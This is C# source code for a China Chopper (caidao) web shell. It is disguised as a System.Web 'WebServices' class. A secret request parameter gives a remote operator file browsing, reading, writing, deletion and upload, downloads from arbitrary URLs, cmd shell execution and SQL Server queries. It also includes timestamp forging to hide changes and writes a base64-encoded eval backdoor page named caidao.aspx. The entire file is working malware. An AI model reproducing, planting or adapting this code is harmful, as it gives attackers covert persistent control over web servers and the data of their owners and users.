using System;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security;
using System.Text;
namespace System.Web
{
	public class WebServices
	{
		private static string ChopperApi_Response_Start_Flag = "->|";
		private static string ChopperApi_Response_End_Flag = "|<-";
		private static string ChopperApi_Response_Error_Flag = "ERROR:// ";

		public static void OutPutResponseString(string str_to_Response)
		{
			HttpContext.Current.Response.Clear();
			HttpContext.Current.Response.Write(str_to_Response);
			HttpContext.Current.Response.End();
		}

		public static void InitalizeWebServices(string password)
		{
			if (HttpContext.Current.Request[password] != null)
			{
				switch (HttpContext.Current.Request[password])
				{
				case "A":
					WebServices.OutPutResponseString(WebServices.ChopperApi_A_Get_LocalDirectory_and_AllDirves());
					return;
				case "B":
					WebServices.OutPutResponseString(WebServices.ChopperApi_B_GetFileList());
					return;
				case "C":
					WebServices.OutPutResponseString(WebServices.ChopperApi_C_ReadTextFile());
					return;
				case "D":
					WebServices.OutPutResponseString(WebServices.ChopperApi_D_WriteTextFile());
					return;
				case "E":
					WebServices.OutPutResponseString(WebServices.ChopperApi_E_DeleteFile());
					return;
				case "F":
					WebServices.ChopperApi_F_DownloadFile();
					return;
				case "G":
                    WebServices.OutPutResponseString(WebServices.ChopperApi_G_UploadFile(HttpContext.Current.Request["z1"], HttpContext.Current.Request["z2"]));
					return;
				case "H":
					WebServices.OutPutResponseString(WebServices.ChopperApi_H_CopyFile());
					return;
				case "I":
					WebServices.OutPutResponseString(WebServices.ChopperApi_I_RenameFile());
					return;
				case "J":
					WebServices.OutPutResponseString(WebServices.ChopperApi_J_CreateDirectory());
					return;
				case "K":
					WebServices.OutPutResponseString(WebServices.ChopperApi_K_SetFileTime());
					return;
				case "L":
					WebServices.OutPutResponseString(WebServices.ChopperApi_L_DownloadFileFormUrl());
					return;
				case "M":
					WebServices.OutPutResponseString(WebServices.ChopperApi_M_RunCMDShell());
					return;
				case "N":
					WebServices.OutPutResponseString(WebServices.ChopperApi_N_GetDateBaseInfo());
					return;
				case "O":
					WebServices.OutPutResponseString(WebServices.ChopperApi_O_GetDateBaseTables());
					return;
				case "P":
					WebServices.OutPutResponseString(WebServices.ChopperApi_P_GetDateBaseColumns());
					return;
				case "Q":
					WebServices.OutPutResponseString(WebServices.ChopperApi_Q_ExecuteSqlCommand());
					break;
                case "R":
                    WebServices.OutPutResponseString(WebServices.ChopperApi_R_WriteDotnetScript());
                    break;
				default:
					break;
				}
			}

            string parm=new System.IO.StreamReader(HttpContext.Current.Request.InputStream).ReadLine();
            if (parm!=null && parm.Contains("&" + password))
            {
                //HttpContext.Current.Request[password]
                string pass=HttpContext.Current.Request[password];
                string[] extArr = { ".aspx", ".txt", ".exe", ".asp", ".bat", ".dll", ".php", ".jsp", ".jspx", ".rar", ".gz", ".zip", ".cer", ".asa", ".ashx", ".jpg", ".gif", ".bmp", ".dat" };
                int index = 0;
                int length = 0;
                foreach (string ext in extArr)
                {
                    index = pass.ToLower().LastIndexOf(ext);
                    if (index != -1)
                    {
                        length = index + ext.Length;
                        break;
                    }
                }
                if (index == -1)
                    return;

                WebServices.OutPutResponseString(WebServices.ChopperApi_G_UploadFile(pass.Substring(0, length), pass.Remove(0, length)));
            }
            return;
		}

		public static void Run(string password, string Auth_Key)
		{
			WebServices.OutPutResponseString("This Function can not use now.");
		}

		private static string ChopperApi_A_Get_LocalDirectory_and_AllDirves()
		{
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				stringBuilder.Append(HttpContext.Current.Server.MapPath(".") + "\\\t");
				string[] logicalDrives = Directory.GetLogicalDrives();
				string[] array = logicalDrives;
				for (int i = 0; i < array.Length; i++)
				{
					string text = array[i];
					stringBuilder.Append(text.Substring(0, 2));
				}
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_B_GetFileList()
		{
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			string text = HttpContext.Current.Request["z1"];
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(text);
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				DirectoryInfo[] array = directories;
				for (int i = 0; i < array.Length; i++)
				{
					DirectoryInfo directoryInfo2 = array[i];
					string filePath = text + directoryInfo2.Name;
					stringBuilder.Append(directoryInfo2.Name + "/\t");
					stringBuilder.Append(WebServices.ChopperFunc_GetFileTime(filePath) + "\t0\t");
					stringBuilder.Append(WebServices.ChopperFunc_GetFileAttrib(filePath) + "\n");
				}
				FileInfo[] files = directoryInfo.GetFiles();
				FileInfo[] array2 = files;
				for (int j = 0; j < array2.Length; j++)
				{
					FileInfo fileInfo = array2[j];
					string filePath = text + fileInfo.Name;
					stringBuilder.Append(fileInfo.Name + "\t");
					stringBuilder.Append(WebServices.ChopperFunc_GetFileTime(filePath) + "\t");
					stringBuilder.Append(fileInfo.Length + "\t");
					stringBuilder.Append(WebServices.ChopperFunc_GetFileAttrib(filePath) + "\n");
				}
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_C_ReadTextFile()
		{
			string path = HttpContext.Current.Request["z1"];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				StreamReader streamReader = new StreamReader(path, Encoding.Default);
				stringBuilder.Append(streamReader.ReadToEnd());
				streamReader.Close();
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_D_WriteTextFile()
		{
			string path = HttpContext.Current.Request["z1"];
			string value = HttpContext.Current.Request["z2"];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				StreamWriter streamWriter = new StreamWriter(path, false, Encoding.Default);
				streamWriter.Write(value);
				streamWriter.Close();
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_E_DeleteFile()
		{
			string path = HttpContext.Current.Request["z1"];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				if (Directory.Exists(path))
				{
					Directory.Delete(path, true);
				}
				else
				{
					if (File.Exists(path))
					{
						File.Delete(path);
					}
				}
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static void ChopperApi_F_DownloadFile()
		{
			string path = HttpContext.Current.Request["z1"];
			HttpContext.Current.Response.Clear();
			HttpContext.Current.Response.Write(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				byte[] array = new byte[102400];
				FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
				BinaryReader binaryReader = new BinaryReader(fileStream);
				long length = fileStream.Length;
				for (long num = 0L; num < length / (long)array.Length; num += 1L)
				{
					array = binaryReader.ReadBytes(array.Length);
					HttpContext.Current.Response.BinaryWrite(array);
					HttpContext.Current.Response.Flush();
				}
				array = binaryReader.ReadBytes((int)(length % (long)array.Length));
				HttpContext.Current.Response.BinaryWrite(array);
				HttpContext.Current.Response.Flush();
				binaryReader.Close();
				fileStream.Close();
			}
			catch (Exception ex)
			{
				HttpContext.Current.Response.Clear();
				HttpContext.Current.Response.Write(WebServices.ChopperApi_Response_Start_Flag);
				HttpContext.Current.Response.Write(WebServices.ChopperApi_Response_Error_Flag);
				HttpContext.Current.Response.Write(ex.Message);
			}
			HttpContext.Current.Response.Write(WebServices.ChopperApi_Response_End_Flag);
			HttpContext.Current.Response.End();
		}

		private static string ChopperApi_G_UploadFile(string path,string text)
		{
			long num = (long)(text.Length / 2);
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			string text2 = string.Empty;
			try
			{
				byte[] array = new byte[102400];
				int num2 = array.Length;
				FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.Write);
				BinaryWriter binaryWriter = new BinaryWriter(fileStream);
				int num3 = (int)(num / (long)num2);
				int num4 = (int)(num % (long)num2);
				for (int i = 0; i < num3; i++)
				{
					text2 = text.Substring(i * num2 * 2, num2 * 2);
					for (int j = 0; j < num2; j++)
					{
						array[j] = Convert.ToByte(text2.Substring(j * 2, 2), 16);
					}
					binaryWriter.Write(array);
					binaryWriter.Flush();
				}
				text2 = text.Substring(num3 * num2 * 2, num4 * 2);
				for (int k = 0; k < num4; k++)
				{
					array[k] = Convert.ToByte(text2.Substring(k * 2, 2), 16);
				}
				binaryWriter.Write(array, 0, num4);
				binaryWriter.Flush();
				binaryWriter.Close();
				fileStream.Close();
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_H_CopyFile()
		{
			string filePath = HttpContext.Current.Request["z1"];
			string targetPath = HttpContext.Current.Request["z2"];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				WebServices.ChopperFunc_CopyFile_And_Directory(filePath, targetPath);
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_I_RenameFile()
		{
			string text = HttpContext.Current.Request["z1"];
			string text2 = HttpContext.Current.Request["z2"];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				if (Directory.Exists(text))
				{
					Directory.Move(text, text2);
				}
				else
				{
					if (File.Exists(text))
					{
						File.Copy(text, text2);
						File.Delete(text);
					}
				}
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_J_CreateDirectory()
		{
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			string path = HttpContext.Current.Request["z1"];
			try
			{
				Directory.CreateDirectory(path);
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_K_SetFileTime()
		{
			string path = HttpContext.Current.Request["z1"];
			string s = HttpContext.Current.Request["z2"];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			DateTime dateTime = DateTime.ParseExact(s, "yyyy-MM-dd HH:mm:ss", null);
			try
			{
				if (Directory.Exists(path))
				{
					Directory.SetCreationTime(path, dateTime);
					Directory.SetLastWriteTime(path, dateTime);
					Directory.SetLastAccessTime(path, dateTime);
				}
				else
				{
					if (File.Exists(path))
					{
						File.SetCreationTime(path, dateTime);
						File.SetLastWriteTime(path, dateTime);
						File.SetLastAccessTime(path, dateTime);
					}
				}
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_L_DownloadFileFormUrl()
		{
			string address = HttpContext.Current.Request["z1"];
			string path = HttpContext.Current.Request["z2"];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.Write);
				BinaryWriter binaryWriter = new BinaryWriter(fileStream);
				WebClient webClient = new WebClient();
				byte[] buffer = webClient.DownloadData(address);
				binaryWriter.Write(buffer);
				binaryWriter.Flush();
				binaryWriter.Close();
				fileStream.Close();
				stringBuilder.Append("1");
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_M_RunCMDShell()
		{
			string text = HttpContext.Current.Request["z1"];
			string str = HttpContext.Current.Request["z2"];
			text = text.Substring(2, text.Length - 2);
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				stringBuilder.Append(WebServices.ChopperFunc_GetCMDShell_Response(new ProcessStartInfo(text)
				{
					UseShellExecute = false,
					RedirectStandardError = true,
					RedirectStandardOutput = true,
					Arguments = " /c " + str
				}));
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_N_GetDateBaseInfo()
		{
			string connstr = HttpContext.Current.Request["z1"];
			string sQL_Command = "SELECT [name] FROM master.dbo.sysdatabases ORDER BY 1";
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				DataTable dataTable = WebServices.ChopperFunc_ExecuteSQLCommand(connstr, sQL_Command);
				for (int i = 0; i < dataTable.Rows.Count; i++)
				{
					stringBuilder.Append(dataTable.Rows[i][0]);
					stringBuilder.Append("\t");
				}
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_O_GetDateBaseTables()
		{
			string[] array = HttpContext.Current.Request["z1"].Split(new string[]
			{
				"\r\n"
			}, StringSplitOptions.RemoveEmptyEntries);
			string connstr = array[0];
			string str = array[1];
			string sQL_Command = "use " + str + ";SELECT [name] FROM sysobjects WHERE (xtype='U') ORDER BY 1";
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				DataTable dataTable = WebServices.ChopperFunc_ExecuteSQLCommand(connstr, sQL_Command);
				for (int i = 0; i < dataTable.Rows.Count; i++)
				{
					stringBuilder.Append(dataTable.Rows[i][0]);
					stringBuilder.Append("\t");
				}
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_P_GetDateBaseColumns()
		{
			string[] array = HttpContext.Current.Request["z1"].Split(new string[]
			{
				"\r\n"
			}, StringSplitOptions.RemoveEmptyEntries);
			string connstr = array[0];
			string arg = array[1];
			string arg2 = array[2];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			string sQL_Command = string.Format("USE [{0}];SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id('{1}') and A.xtype=B.xtype ORDER BY A.colid", arg, arg2);
			try
			{
				DataTable dataTable = WebServices.ChopperFunc_ExecuteSQLCommand(connstr, sQL_Command);
				for (int i = 0; i < dataTable.Rows.Count; i++)
				{
					stringBuilder.Append(string.Concat(new object[]
					{
						dataTable.Rows[i][0],
						"(",
						dataTable.Rows[i][1],
						")"
					}));
					stringBuilder.Append("\t");
				}
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

		private static string ChopperApi_Q_ExecuteSqlCommand()
		{
			string[] array = HttpContext.Current.Request["z1"].Split(new string[]
			{
				"\r\n"
			}, StringSplitOptions.RemoveEmptyEntries);
			string sQL_Command = HttpContext.Current.Request["z2"];
			string connstr = array[0];
			string arg_4A_0 = array[1];
			StringBuilder stringBuilder = new StringBuilder(WebServices.ChopperApi_Response_Start_Flag);
			try
			{
				DataTable dataTable = WebServices.ChopperFunc_ExecuteSQLCommand(connstr, sQL_Command);
				for (int i = 0; i < dataTable.Columns.Count; i++)
				{
					stringBuilder.Append(dataTable.Columns[i] + "\t|\t");
				}
				stringBuilder.Append("\r\n");
				for (int j = 0; j < dataTable.Rows.Count; j++)
				{
					for (int k = 0; k < dataTable.Columns.Count; k++)
					{
						stringBuilder.Append(dataTable.Rows[j][k].ToString() + "\t|\t");
					}
					stringBuilder.Append("\r\n");
				}
			}
			catch (Exception ex)
			{
				stringBuilder.Remove(3, stringBuilder.Length - 3);
				stringBuilder.Append(WebServices.ChopperApi_Response_Error_Flag);
				stringBuilder.Append(ex.Message);
			}
			stringBuilder.Append(WebServices.ChopperApi_Response_End_Flag);
			return stringBuilder.ToString();
		}

        private static string ChopperApi_R_WriteDotnetScript()
        {
            string currentPath = HttpContext.Current.Server.MapPath(".");
            string result = "ok";
            try
            {
                string base64 = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiJT48JWV2YWwoUmVxdWVzdC5JdGVtWyJ0ZXN0Il0sInVuc2FmZSIpOyU+";
                File.WriteAllBytes(currentPath + "\\caidao.aspx", Convert.FromBase64String(base64));
            }
            catch (Exception ex)
            {
                result = ex.Message;
            }
            return result;
        }

		private static int ChopperFunc_GetFileAttrib(string FilePath)
		{
			return (int)File.GetAttributes(FilePath);
		}

		private static string ChopperFunc_GetFileTime(string FilePath)
		{
			return File.GetLastWriteTime(FilePath).ToString("yyyy-MM-dd HH:mm:ss");
		}

		private static void ChopperFunc_DelFile_and_Directory(string FilePath)
		{
			if (Directory.Exists(FilePath))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(FilePath);
				FileInfo[] files = directoryInfo.GetFiles();
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				FileInfo[] array = files;
				for (int i = 0; i < array.Length; i++)
				{
					FileInfo fileInfo = array[i];
					File.Delete(FilePath + "\\" + fileInfo.Name);
				}
				DirectoryInfo[] array2 = directories;
				for (int j = 0; j < array2.Length; j++)
				{
					DirectoryInfo directoryInfo2 = array2[j];
					WebServices.ChopperFunc_DelFile_and_Directory(FilePath + "\\" + directoryInfo2.Name);
				}
				Directory.Delete(FilePath);
				return;
			}
			if (File.Exists(FilePath))
			{
				File.Delete(FilePath);
			}
		}

		private static void ChopperFunc_CopyFile_And_Directory(string FilePath, string TargetPath)
		{
			if (Directory.Exists(FilePath))
			{
				Directory.CreateDirectory(TargetPath);
				DirectoryInfo directoryInfo = new DirectoryInfo(FilePath);
				FileInfo[] files = directoryInfo.GetFiles();
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				FileInfo[] array = files;
				for (int i = 0; i < array.Length; i++)
				{
					FileInfo fileInfo = array[i];
					File.Copy(FilePath + "\\" + fileInfo.Name, TargetPath + "\\" + fileInfo.Name, true);
				}
				DirectoryInfo[] array2 = directories;
				for (int j = 0; j < array2.Length; j++)
				{
					DirectoryInfo directoryInfo2 = array2[j];
					WebServices.ChopperFunc_CopyFile_And_Directory(FilePath + "\\" + directoryInfo2.Name, TargetPath + "\\" + directoryInfo2.Name);
				}
				return;
			}
			if (File.Exists(FilePath))
			{
				File.Copy(FilePath, TargetPath);
			}
		}

		private static string ChopperFunc_GetCMDShell_Response(ProcessStartInfo CMDStartInfo)
		{
			Process process = new Process();
			process.StartInfo = CMDStartInfo;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			StreamReader standardError = process.StandardError;
			return standardOutput.ReadToEnd() + standardError.ReadToEnd();
		}

		private static DataTable ChopperFunc_ExecuteSQLCommand(string Connstr, string SQL_Command)
		{
			DataTable dataTable = new DataTable();
			SqlConnection sqlConnection = new SqlConnection(Connstr);
			sqlConnection.Open();
			string text = SQL_Command.ToUpper();
			if (text.IndexOf("SELECT ") != -1 || text.IndexOf("EXEC ") != -1 || text.IndexOf("DECLARE ") != -1)
			{
				SqlDataAdapter sqlDataAdapter = new SqlDataAdapter(SQL_Command, sqlConnection);
				sqlDataAdapter.Fill(dataTable);
			}
			else
			{
				SqlCommand sqlCommand = sqlConnection.CreateCommand();
				sqlCommand.CommandText = SQL_Command;
				sqlCommand.ExecuteNonQuery();
				dataTable.Columns.Add("ExecuteResult", typeof(string));
				dataTable.LoadDataRow(new string[]
				{
					"OK"
				}, false);
			}
			return dataTable;
		}

		private static string zcgExtraFunc_RunCMDShell_For_SomeUser(string Domain, string UserName, string PassWord, ProcessStartInfo CMDStartInfo)
		{
			SecureString secureString = new SecureString();
			for (int i = 0; i < PassWord.Length; i++)
			{
				secureString.AppendChar(PassWord[i]);
			}
			CMDStartInfo.UserName = UserName;
			CMDStartInfo.Password = secureString;
			CMDStartInfo.Domain = Domain;
			return WebServices.ChopperFunc_GetCMDShell_Response(CMDStartInfo);
		}
	}
}
